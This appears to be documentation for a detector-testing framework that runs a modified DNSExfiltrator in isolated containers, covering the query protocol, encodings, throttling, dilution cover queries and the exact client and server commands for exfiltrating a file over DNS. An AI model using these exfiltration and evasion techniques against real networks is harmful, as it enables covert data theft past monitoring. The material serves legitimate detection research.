# DNSExfiltrator

TunFrame generates live tunnel traffic with a modified version of DNSExfiltrator. The client exfiltrates a file over DNS A queries to one or more domains; the server answers them and reassembles the file. TunFrame runs one transfer per configuration (baseline, sweeps, profiles) and evaluates the detectors on it.

- Client: [`docker/dnsexfiltrator-client/dnsExfiltrator.cs`](../docker/dnsexfiltrator-client/dnsExfiltrator.cs) (C#, built with Mono in the client image)
- Server: [`docker/dnsexfiltrator-server/volume/dnsExfiltrator.py`](../docker/dnsexfiltrator-server/volume/dnsExfiltrator.py) (Python, `dnslib` and `tldextract`)
- Traffic decoding for the metrics: [`detection/exfil_payload.py`](../detection/exfil_payload.py)

## Origin

The tool is [DNSExfiltrator by Arno0x](https://github.com/Arno0x/DNSExfiltrator), as modified by Kristijan Žiža for:

> Žiža, K., Tadić, P. & Vuletić, P. *DNS exfiltration detection in the presence of adversarial attacks and modified exfiltrator behaviour.* Int. J. Inf. Secur. (2023). <https://doi.org/10.1007/s10207-023-00723-w>

Please cite this paper if you use the tool. Žiža's version added the `base32map` encoding (each base32 character becomes a three-letter English word, chosen so the character distribution resembles regular DNS names and the entropy drops) and randomised throttling.

TunFrame changed it further:

- **Containerised and non-interactive.** Client and server run in Docker, take a domain list file, and are started and stopped by `main.py` for every configuration.
- **Several domains per transfer.** The client rotates over all domains in its domain file; the server accepts every domain in its file.
- **Sequence number in its own label.** Data queries are `<sequence>.<chunk>.<domain>`; the server acknowledges each one with the sequence number in the last octet of the A record.
- **Init with encoding and file size.** The first queries announce `<encoding number>|<file size>` instead of a request count, so the server knows when the file is complete.
- **Dilution queries.** Optional cover queries between data queries (`dil=`).
- **Fixes from the protocol review** (see [Development](development.md#dnsexfiltrator-test-suites)): chunk size accounts for the encoding overhead, label length is enforced on both sides, retries with exponential backoff, retried chunks are acknowledged again instead of failing.
- **No base64.** Only `base32`, `base32map` and `hex` remain.

## Protocol

### 1. Preparation (client)

The client reads the file, packs it into a ZIP archive in memory (one entry named like the file) and transfers that archive. All sizes below, including the announced file size, refer to the ZIP archive.

### 2. Init

The init text is `<encoding number>|<archive size>`, e.g. `1|3030`. Encoding numbers: `0` base32map, `1` base32, `2` hex. The text is always encoded with base32map (lower case), whatever the data encoding, and split into parts of at most `l` characters. Part `i` is sent as

```text
<part>.<domain[i mod n]>
```

A single label below the registered domain marks an init query. Each part is retried until the server replies with any A record. The server collects the parts until they decode to a valid init text and then switches to data mode.

### 3. Data

The archive is cut into chunks, each chunk is RC4-encrypted with the password (one keystream over the whole transfer) and encoded. Data query `k` (counting from 0) is

```text
<k mod 256>.<encoded chunk>.<domain[(k + init parts) mod n]>
```

The sequence number is plain decimal. The server decodes and decrypts the chunk, appends it if the sequence number is the expected one, and answers with an A record whose last octet is the sequence number (the other octets are random). The client accepts a reply only if that octet matches, otherwise it retries.

Chunk size per query, for label limit `l` (bytes of the archive):

| Encoding | Chunk size | At `l = 63` | Characters per byte |
| --- | --- | --- | --- |
| `base32` | `⌊5·l/8⌋ − 1` | 38 B (61 characters) | 1.6 |
| `hex` | `⌊l/2⌋ − 1` | 30 B (60 characters) | 2 |
| `base32map` | `⌊5·⌊l/3⌋/8⌋ − 1` | 12 B (60 characters) | 4.8 |

The `− 1` reserves a byte for the sequence number, which used to travel inside the chunk; it is now in its own label, so the byte stays unused. For `base32map` the label budget is divided by three (each base32 character becomes a three-letter word), so the chunk size is 0 below `l = 12`; `main.py` rejects such configurations before the run starts. A transfer of a 3 KB archive therefore needs about 80 queries with base32 and about 250 with base32map.

### 4. Dilution (optional)

With `dil=n` the client sends `n` dilution queries before every data query except the first. Each is a label of 3–5 copies of one of `a e i o u w` (e.g. `eeee`) under the domain of the following data query. They are not throttled, not retried, and carry no data; the server answers them with a random A record.

### 5. Timing, retries and end

- After every init part and every data query the client waits `t + random(0, tr)` milliseconds.
- A query without a valid reply is retried up to `retry` times; before attempt `a` it waits `retrydelay · 2^a` ms, at most 10 s. If all attempts fail, the client aborts.
- When the server has received as many bytes as announced, it writes `outputfile.zip`, prints `File saved successfully` and resets for the next transfer.

The server only answers A queries for registered domains (eTLD+1, same pinned Public Suffix List as the detectors) listed in its domain file, and ignores everything else.

## Client

```text
mono DNSExfiltrator.exe <file> <domain file> <password> [options]
```

| Option | Meaning | Default |
| --- | --- | --- |
| `s=<ip>` | DNS server to query (each query runs `dig @<ip> <name> +short`); without it the system resolver is used | system resolver |
| `t=<ms>` | Fixed wait after every init part and data query | `0` |
| `tr=<ms>` | Additional random wait, `0` to `ms` | `0` |
| `l=<n>` | Maximum label length, 1–63 | `63` |
| `e=<encoding>` | `base32`, `base32map` or `hex` | `base32map` |
| `retry=<n>` | Attempts per query | `3` |
| `retrydelay=<ms>` | Base delay of the exponential backoff | `1000` |
| `dil=<n>` | Dilution queries before each data query | `0` |

The domain file lists one domain per line.

## Server

```text
python3 dnsExfiltrator.py -f <domain file> -p <password> -o <output name>
```

It listens on UDP port 53, writes the received archive to `<output name>.zip` and prints a preview of its content.

## How TunFrame runs it

The containers belong to the `dnsexfiltrator` Docker Compose profile. `main.py` starts them when the first DNSExfiltrator configuration begins (after peacetime, the benign-only window and the tunnel replay window), so they do not exist before that. Both containers idle (`sleep infinity`); the tools are started with `docker exec` per configuration.

| | Client | Server |
| --- | --- | --- |
| Container | `dnsexfiltrator-client`, `172.16.40.40` on `client-network` | `dnsexfiltrator-server`, `192.168.4.4` on `server-network` |
| Host directory | `docker/dnsexfiltrator-client/data/` → `/data` | `docker/dnsexfiltrator-server/volume/` → `/app` |
| Domain file | `/data/domains.txt` | `/app/domains.txt` |
| Log | `/data/logs/client.log` | `/app/logs/server.log` |

For every configuration `main.py`:

1. stops the previous client and server (`pkill`),
2. writes the configuration's `domains` to both domain files,
3. flushes cached answers for these domains on resolver, root and TLD server (`rndc flushtree`), so the transfer reaches this configuration's server,
4. starts the server: `python3 -u /app/dnsExfiltrator.py -f /app/domains.txt -p <password> -o /app/outputfile`,
5. opens the window (timer, background replays) and starts the client:
   `mono /app/DNSExfiltrator.exe /data/<file> /data/domains.txt <password> s=172.16.0.2 t=<throttle> tr=<throttle_random> l=<label_max_size> e=<encoding> dil=<dilution>` (`retry` and `retrydelay` keep their defaults),
6. checks that tunnel traffic reached the resolver; a configuration whose client is gone without any tunnel traffic is saved as `skipped`,
7. with `stop_on_transfer_complete`, ends the window shortly after `File saved successfully` appears in the server log (see [Run lifecycle](run-lifecycle.md#how-a-window-ends)).

The client queries the TunFrame resolver (`172.16.0.2`), which forwards the configured domains through the simulated root and TLD servers to the tunnel server, see [Architecture](architecture.md).

Both tools run under a wrapper that writes their output to the log files above and to `docker logs`; the client runs on a pseudo-terminal so its output streams line by line and in colour. The log files are cleared at the start of every run and copied into the run directory at its end (`exfil-server.log`, `exfil-client.log`); the dashboard shows them in its *Exfil server* and *Exfil client* tabs.

### Files to transfer

`dnsexfiltrator.*.file` names a file in the client's `/data` directory, i.e. `docker/dnsexfiltrator-client/data/` on the host (CSV files there are not versioned; provide your own). An absolute host path is copied into that directory first.

### Parameters and defaults

The configuration keys (`file`, `password`, `throttle`, `throttle_random`, `label_max_size`, `encoding`, `dilution`, `domains`, `expansion_factor`), their defaults, sweeps and profiles are described in [Configuration](configuration.md#dnsexfiltrator). Note that TunFrame's default encoding is `base32`, while the client's own default is `base32map`.

## What the metrics read from the traffic

[`detection/exfil_payload.py`](../detection/exfil_payload.py) classifies every tunnel query of a window as init, data or dilution and decodes the size of each data chunk exactly from its length and the encoding announced in the init (base32: 5 bits per character, base32map: 5 bits per three-letter word, hex: 4 bits per character). Retried chunks are counted once. This gives the exact number of file bytes that passed before a detector's alarm (`net_up_bytes`) and the leaked share of the file (`ulv_percent`), see [Detectors and metrics](detectors.md#leakage).

## Known limitations

- **A retried data chunk is decrypted again** by the server before it is recognised as a retry, which advances the RC4 keystream; the rest of that transfer would then decrypt incorrectly. The acknowledgement itself is correct, and TunFrame's metrics do not depend on the decrypted content. On the isolated network retries are rare.
- **The init has no acknowledgement value.** Any A reply counts as success for an init part.
- **`base64` is no longer supported, but not rejected.** TunFrame passes `encoding: base64` to the client, which then encodes base32map with base64 chunk sizes: every chunk exceeds the label limit and is skipped, so nothing is transferred. `detection/exfil_payload.py` still decodes base64 for results recorded with older clients.
- **One `dig` process per query.** With `s=` set, every query starts a `dig` process, which limits the query rate the client can reach.
